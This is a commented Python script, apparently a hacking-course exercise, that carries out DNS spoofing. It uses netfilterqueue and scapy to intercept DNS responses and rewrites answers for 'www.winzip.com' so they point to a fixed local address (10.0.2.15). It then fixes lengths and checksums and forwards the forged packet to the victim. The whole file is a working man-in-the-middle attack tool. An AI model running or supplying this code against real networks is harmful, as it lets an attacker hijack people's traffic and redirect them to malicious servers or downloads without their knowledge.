#!/usr/bin/env python
#will recieve request from target comp. send to dns server, recieve response, modify response and send modified response back to target comp

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #wrapping payload of this packet with scapy ip layer. scapy automatically coverts to scapy packet and lets us interact with packet
    if scapy_packet.haslayer(scapy.DNSRR): #checking if packet has DNS response
        qname = str(scapy_packet[scapy.DNSQR].qname) #this is setting a variable equale to the domain the target user searched for
        if "www.winzip.com" in qname: #checking to see if specific website is what the search is
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15") #specified rrname and rdata (ip return as ip of requested domain) and creates a spoofed answer
            #looked at proper DNS response as output in terminal to figure this out
            scapy_packet[scapy.DNS].an = answer #modifies response to be the spoofed answer
            scapy_packet[scapy.DNS].ancount = 1 #modifies answer count

            del scapy_packet[scapy.IP].len #removing these fields from scapy packet to ensure they don't corrupt our packet
            del scapy_packet[scapy.IP].chksum #scapy will automatically recalculate these values when packet is being sent
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet)) #sets actual packet equal to the modified scapy packet

    packet.accept() #forwards packets to destination


queue = netfilterqueue.NetfilterQueue() #creating instance of netfilterqueue object and placing it in variable named "queue"
queue.bind(0, process_packet) #connecting object to queue we created in terminal using same id we gave in the terminal
#have callback function to execute one each packet that will be caught in queue
queue.run() #runs the queue we created

